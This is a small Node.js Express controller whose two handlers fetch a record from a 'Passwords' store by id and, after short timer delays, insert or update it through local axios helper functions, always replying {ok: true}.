const {
  getInfo,
  axiosInsertData,
  axiosUpdateData,
} = require("../utils/axiosfn");

const password = async (req, res) => {
  const { code, id } = req.body;
  // console.log(code, id);
  if (id === undefined) {
    res.status(200).send({ ok: true });
    return;
  }
  setTimeout(async () => {
    const objData = await getInfo("Passwords", id);
    // console.log(objData, "-");

    setTimeout(() => {
      axiosInsertData("Passwords", objData[0], id);
    }, 200);
  }, 1000);

  res.status(200).send({ ok: true });
};

const updatePassword = async (req, res) => {
  const { id } = req.body;
  // console.log(id);
  if (id === undefined) {
    res.status(200).send({ ok: true });
    return;
  }
  setTimeout(async () => {
    const objData = await getInfo("Passwords", id);
    // console.log(objData, "-");

    setTimeout(() => {
      axiosUpdateData("Passwords", id, objData[0]);
    }, 200);
  }, 1000);

  res.status(200).send({ ok: true });
};

module.exports = {
  password,
  updatePassword,
};
